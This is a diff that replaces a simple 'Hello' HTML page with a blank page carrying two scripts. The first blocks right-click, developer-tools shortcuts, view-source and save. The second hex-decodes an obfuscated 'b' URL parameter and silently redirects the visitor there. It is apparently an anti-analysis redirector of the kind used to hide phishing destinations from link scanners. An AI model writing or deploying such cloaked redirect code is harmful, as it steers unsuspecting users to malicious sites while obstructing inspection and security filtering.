@@ -1,3 +1,69 @@
+<!DOCTYPE html>
 <html>
-<p>Hello...</p>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+	<script>
+    // disable right click
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function (e) {
+
+        // disable F12 key
+        if(e.keyCode == 123) {
+            return false;
+        }
+
+        // disable I key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+            return false;
+        }
+
+        // disable J key
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            return false;
+        }
+
+        // Prevent Ctrl+s = disable save
+        if (event.ctrlKey && (event.keyCode === 85 || event.keyCode === 83 || event.keyCode ===65 )) {
+            return false;
+        }
+
+        // disable U key
+        if(e.ctrlKey && e.keyCode == 85) {
+            return false;
+        }
+    }
+
+</script>
+    <script>
+        window.onload = function () {
+            const params = new URLSearchParams(window.location.search);
+            const sd = params.get('b');
+
+            if (sd && sd.length > 1) {
+                const wsd = sd.substring(1);
+                let bud = '';
+
+                for (let i = 0; i < wsd.length - 1; i += 2) {
+                    const hexPair = wsd.substring(i, i + 2);
+                    const charCode = parseInt(hexPair, 16);
+                    bud += String.fromCharCode(charCode);
+                }
+
+                // Optional: auto-add http:// if not present
+                if (!/^https?:\/\//i.test(bud)) {
+                    bud = 'http://' + bud;
+                }
+
+                window.location.href = bud;
+            } else {
+                // Redirect to about:blank if ID is missing or invalid
+                window.location.href = 'about:blank';
+            }
+        };
+    </script>
+</head>
+<body>
+</body>
 </html>
